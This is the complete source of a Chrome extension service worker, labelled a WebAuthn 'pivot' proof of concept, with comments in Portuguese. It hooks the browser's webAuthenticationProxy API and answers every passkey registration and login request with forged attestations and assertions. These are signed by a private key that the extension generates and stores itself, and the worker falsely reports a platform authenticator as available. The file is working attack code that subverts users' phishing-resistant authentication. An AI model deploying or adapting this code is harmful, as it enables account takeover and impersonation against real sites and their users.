// sw.js — WebAuthn Pivot PoC (MV3)
// Gera attestation "none" com chave da extensão e assina GET com a mesma chave.
// Inclui publicKey (SPKI DER b64url) + publicKeyAlgorithm (-7), fila e cancel-safe.

const te = new TextEncoder();

// ===== Utils =====
function toB64u(buf) {
  if (!buf) return undefined;
  const u8 = buf instanceof Uint8Array ? buf : new Uint8Array(buf);
  let s = ""; for (let i = 0; i < u8.length; i++) s += String.fromCharCode(u8[i]);
  return btoa(s).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/,"");
}
function fromB64u(b64u) {
  const b64 = (b64u || "").replace(/-/g, "+").replace(/_/g, "/");
  const s = atob(b64); const u8 = new Uint8Array(s.length);
  for (let i = 0; i < s.length; i++) u8[i] = s.charCodeAt(i);
  return u8;
}
function randBytes(n){ const u=new Uint8Array(n); crypto.getRandomValues(u); return u; }
async function sha256(buf){ const u8=buf instanceof Uint8Array?buf:new Uint8Array(buf); return new Uint8Array(await crypto.subtle.digest("SHA-256", u8)); }
function be32(n){ const b=new Uint8Array(4); new DataView(b.buffer).setUint32(0, n>>>0, false); return b; }
function concat(...arrs){ const len=arrs.reduce((a,b)=>a+b.length,0); const out=new Uint8Array(len); let o=0; for(const a of arrs){ out.set(a,o); o+=a.length; } return out; }

// ===== CBOR mínimo =====
function head(major,len){
  if (len<24) return Uint8Array.of((major<<5)|len);
  if (len<256) return Uint8Array.of((major<<5)|24,len);
  if (len<65536) return Uint8Array.of((major<<5)|25,(len>>8)&0xff,len&0xff);
  const b=new Uint8Array(6); b[0]=(major<<5)|26; new DataView(b.buffer).setUint32(2,len,false); return b;
}
const cbor = {
  bytes:(u8)=>concat(head(2,u8.length),u8),
  text:(s)=>{const u=te.encode(s); return concat(head(3,u.length),u);},
  uint:(n)=>head(0,n),
  nint:(n)=>{ const v=(-1-n)>>>0; return head(1,v); },
  map:(entries)=>{ const out=[head(5,entries.length)]; for(const [k,v] of entries) out.push(k,v); return concat(...out); }
};
function coseEC2(x,y){ // ES256
  return cbor.map([
    [cbor.uint(1), cbor.uint(2)],     // kty=EC2
    [cbor.uint(3), cbor.nint(-7)],    // alg=-7 (ES256)
    [cbor.nint(-1), cbor.uint(1)],    // crv=1 (P-256)
    [cbor.nint(-2), cbor.bytes(x)],
    [cbor.nint(-3), cbor.bytes(y)]
  ]);
}

// ===== DER/SPKI helpers (publicKey) =====
function derLen(n){
  if (n < 128) return Uint8Array.of(n);
  const bytes = [];
  while (n > 0) { bytes.unshift(n & 0xff); n >>= 8; }
  return Uint8Array.of(0x80 | bytes.length, ...bytes);
}
function derSeq(...parts){
  const content = concat(...parts);
  return concat(Uint8Array.of(0x30), derLen(content.length), content);
}
function derOID(arcs){
  const first = 40*arcs[0] + arcs[1];
  const out = [first];
  for (let i=2;i<arcs.length;i++){
    let v = arcs[i], stack=[];
    do { stack.unshift(v & 0x7f); v >>= 7; } while (v > 0);
    for (let j=0;j<stack.length-1;j++) out.push(0x80 | stack[j]);
    out.push(stack[stack.length-1]);
  }
  const body = new Uint8Array(out);
  return concat(Uint8Array.of(0x06), derLen(body.length), body);
}
function derBitString(bytes){
  return concat(Uint8Array.of(0x03), derLen(bytes.length + 1), Uint8Array.of(0x00), bytes);
}
function jwkToSPKI_P256(xU8, yU8){
  const uncompressed = new Uint8Array(1+32+32);
  uncompressed[0]=0x04; uncompressed.set(xU8,1); uncompressed.set(yU8,33);
  const oid_ecPublicKey = derOID([1,2,840,10045,2,1]);
  const oid_prime256v1  = derOID([1,2,840,10045,3,1,7]);
  const algId = derSeq(oid_ecPublicKey, oid_prime256v1);
  const spk   = derBitString(uncompressed);
  return derSeq(algId, spk); // SubjectPublicKeyInfo
}

// ===== Pivot state (credencial controlada pela extensão) =====
async function getPivot(){ const s=await chrome.storage.local.get(["pivot"]); return s.pivot||null; }
async function setPivot(v){ await chrome.storage.local.set({ pivot:v }); }
async function resetPivot(){ await chrome.storage.local.remove("pivot"); }

async function getOrCreatePivot() {
  let st = await getPivot();
  if (st && st.privateJwk && st.publicJwk && st.credIdB64u) return st;

  const key = await crypto.subtle.generateKey(
    { name:"ECDSA", namedCurve:"P-256" }, true, ["sign","verify"]
  );
  const pub = await crypto.subtle.exportKey("jwk", key.publicKey);
  const prv = await crypto.subtle.exportKey("jwk", key.privateKey);

  const credId = randBytes(32);
  st = {
    privateJwk: prv,
    publicJwk: pub,
    xB64u: pub.x, yB64u: pub.y,
    credIdB64u: toB64u(credId),
    signCount: 0
  };
  await setPivot(st);
  return st;
}
async function importPriv(jwk){
  return crypto.subtle.importKey("jwk", jwk, { name:"ECDSA", namedCurve:"P-256" }, false, ["sign"]);
}

// ===== Montagem de respostas =====
function guessOrigin(options){
  const ext = options?.extensions?.remoteDesktopClientOverride;
  if (ext?.origin) return ext.origin;
  const rpId = options?.rp?.id || options?.rpId;
  return rpId ? `https://${rpId}` : "https://example.com";
}
async function buildClientDataJSON(type, challengeB64u, origin){
  const obj = { type, challenge: challengeB64u, origin, crossOrigin: false };
  const json = te.encode(JSON.stringify(obj));
  const hash = await sha256(json);
  return { json, hash };
}
async function makeAuthDataCreate(rpId, credIdU8, xU8, yU8){
  const rpHash = await sha256(te.encode(rpId));
  const flags = 0x01 | 0x40; // UP + AT
  const signCount = be32(0);
  const aaguid = new Uint8Array(16);
  const credLen = new Uint8Array([ (credIdU8.length>>8)&0xff, credIdU8.length&0xff ]);
  const cose = coseEC2(xU8, yU8);
  return concat(rpHash, Uint8Array.of(flags), signCount, aaguid, credLen, credIdU8, cose);
}
function makeAttObjNone(authDataU8){
  return cbor.map([
    [cbor.text("fmt"), cbor.text("none")],
    [cbor.text("attStmt"), cbor.map([])],
    [cbor.text("authData"), cbor.bytes(authDataU8)]
  ]);
}
async function makeAuthDataGet(rpId, signCount){
  const rpHash = await sha256(te.encode(rpId));
  const flags = 0x01; // UP
  return concat(rpHash, Uint8Array.of(flags), be32(signCount>>>0));
}

// ===== CREATE (registro forjado) =====
async function pivotCreate(options){
  const pub = options.publicKey || options;
  const rpId = pub.rp?.id || pub.rpId || "webauthn.io";

  const pivot = await getOrCreatePivot();
  const credIdU8 = fromB64u(pivot.credIdB64u);
  const xU8 = fromB64u(pivot.xB64u), yU8 = fromB64u(pivot.yB64u);

  const origin = guessOrigin(options);
  const { json: cdj } = await buildClientDataJSON("webauthn.create", pub.challenge, origin);

  const authData = await makeAuthDataCreate(rpId, credIdU8, xU8, yU8);
  const attObj  = makeAttObjNone(authData);

  // publicKey (SPKI DER) + algoritmo ES256 (-7)
  const spki = jwkToSPKI_P256(xU8, yU8);

  return {
    id: pivot.credIdB64u,
    rawId: pivot.credIdB64u,
    type: "public-key",
    response: {
      clientDataJSON: toB64u(cdj),
      authenticatorData: toB64u(authData), // opcional, ajuda alguns RPs
      transports: ["internal"],
      publicKey: toB64u(spki),            // **requerido** pelo proxy
      publicKeyAlgorithm: -7,             // ES256
      attestationObject: toB64u(attObj),
      authenticatorAttachment: null
    },
    authenticatorAttachment: "platform",
    clientExtensionResults: {}
  };
}

// ===== GET (assinatura com chave da extensão) =====
async function pivotGet(options){
  const pub = options.publicKey || options;
  const rpId = pub.rpId || "webauthn.io";

  const pivot = await getOrCreatePivot();

  if (Array.isArray(pub.allowCredentials) && pub.allowCredentials.length) {
    const ids = pub.allowCredentials.map(a => a.id);
    if (!ids.includes(pivot.credIdB64u)) {
      throw new Error("Pivot credId not allowed in allowCredentials.");
    }
  }

  const origin = guessOrigin(options);
  const { json: cdj, hash: cdjHash } = await buildClientDataJSON("webauthn.get", pub.challenge, origin);

  const nextCount = (pivot.signCount|0) + 1;
  const authData = await makeAuthDataGet(rpId, nextCount);

  const dataToSign = concat(authData, cdjHash);
  const priv = await importPriv(pivot.privateJwk);

  const sig = await crypto.subtle.sign({ name:"ECDSA", hash:"SHA-256" }, priv, dataToSign);
  const derSig = rawToDer(new Uint8Array(sig));
  
  await setPivot({ ...pivot, signCount: nextCount });

  return {
    id: pivot.credIdB64u,
    rawId: pivot.credIdB64u,
    type: "public-key",
    response: {
      clientDataJSON: toB64u(cdj),
      authenticatorData: toB64u(authData),
      signature: toB64u(derSig),
      userHandle: undefined
    },
    authenticatorAttachment: "platform",
    clientExtensionResults: {}
  };
}

function rawToDer(rawSig) {
  const r = rawSig.slice(0, 32);
  const s = rawSig.slice(32, 64);

  return derSeq(
    derInt(r),
    derInt(s)
  );
}

function derInt(bytes) {
  let i = 0;
  
  while (i < bytes.length - 1 && bytes[i] === 0) {
    i++;
  }
  bytes = bytes.slice(i);

  if (bytes[0] & 0x80) {
    bytes = concat(Uint8Array.of(0x00), bytes);
  }

  return concat(Uint8Array.of(0x02), derLen(bytes.length), bytes);
}

// ===== Fila + cancel-safe =====
const queue = [];                // [{kind, requestId, optionsJson}]
const queuedById = new Map();
let active = null;
const canceled = new Set();

function enqueue(kind, requestId, optionsJson){
  const item = { kind, requestId, optionsJson };
  queue.push(item); queuedById.set(requestId, item);
  processNext().catch(console.error);
}
function dequeueById(requestId){
  const it = queuedById.get(requestId);
  if (!it) return false;
  queuedById.delete(requestId);
  const ix = queue.indexOf(it);
  if (ix>=0) queue.splice(ix,1);
  return true;
}
async function completeSuccess(kind, requestId, credentialJson){
  if (canceled.has(requestId)) return;
  try{
    const responseJson = JSON.stringify(credentialJson);
    if (kind==="create") await chrome.webAuthenticationProxy.completeCreateRequest({ requestId, responseJson });
    else await chrome.webAuthenticationProxy.completeGetRequest({ requestId, responseJson });
  }catch(e){
    if (/Invalid requestId/i.test(String(e?.message))) return;
    throw e;
  }
}
async function completeError(kind, requestId, name, message){
  if (canceled.has(requestId)) return;
  try{
    const payload = { requestId, error:{ name, message } };
    if (kind==="create") await chrome.webAuthenticationProxy.completeCreateRequest(payload);
    else await chrome.webAuthenticationProxy.completeGetRequest(payload);
  }catch(e){
    if (/Invalid requestId/i.test(String(e?.message))) return;
    throw e;
  }
}
async function processNext(){
  if (active || queue.length===0) return;
  active = queue.shift();
  queuedById.delete(active.requestId);

  const { kind, requestId, optionsJson } = active;
  const options = JSON.parse(optionsJson);
  console.log(`[PoC] ${kind.toUpperCase()} options:`, options);

  try{
    if (canceled.has(requestId)) throw new DOMException("Aborted","AbortError");
    const result = (kind==="create") ? await pivotCreate(options) : await pivotGet(options);
    await completeSuccess(kind, requestId, result);
  }catch(e){
    console.error(`${kind.toUpperCase()} complete error:`, e);
    await completeError(kind, requestId, e.name||"AbortError", String(e?.message||e));
  }finally{
    active = null;
    processNext().catch(console.error);
  }
}

// ===== Listeners =====
(async () => {
  try{
    await chrome.webAuthenticationProxy.attach();
    console.log("[PoC] webAuthenticationProxy ATTACHED");
  }catch(e){
    console.warn("[PoC] attach() failed:", e?.message||e);
  }
})();

chrome.webAuthenticationProxy.onCreateRequest.addListener(({ requestId, requestDetailsJson })=>{
  enqueue("create", requestId, requestDetailsJson);
});
chrome.webAuthenticationProxy.onGetRequest.addListener(({ requestId, requestDetailsJson })=>{
  enqueue("get", requestId, requestDetailsJson);
});
chrome.webAuthenticationProxy.onIsUvpaaRequest.addListener(async ({ requestId })=>{
  await chrome.webAuthenticationProxy.completeIsUvpaaRequest({ requestId, isUvpaa: true });
});
chrome.webAuthenticationProxy.onRequestCanceled.addListener((requestId)=>{
  if (dequeueById(requestId)) {
    console.warn("[PoC] Queued request canceled:", requestId);
    return;
  }
  canceled.add(requestId);
  console.warn("[PoC] Active request canceled:", requestId);
});

// Popup hook (reset)
chrome.runtime.onMessage.addListener((msg, _s, sendResponse)=>{
  (async()=>{
    if (msg?.cmd==="resetPivot"){ await resetPivot(); sendResponse({ok:true}); return; }
    sendResponse({ok:false});
  })();
  return true;
});

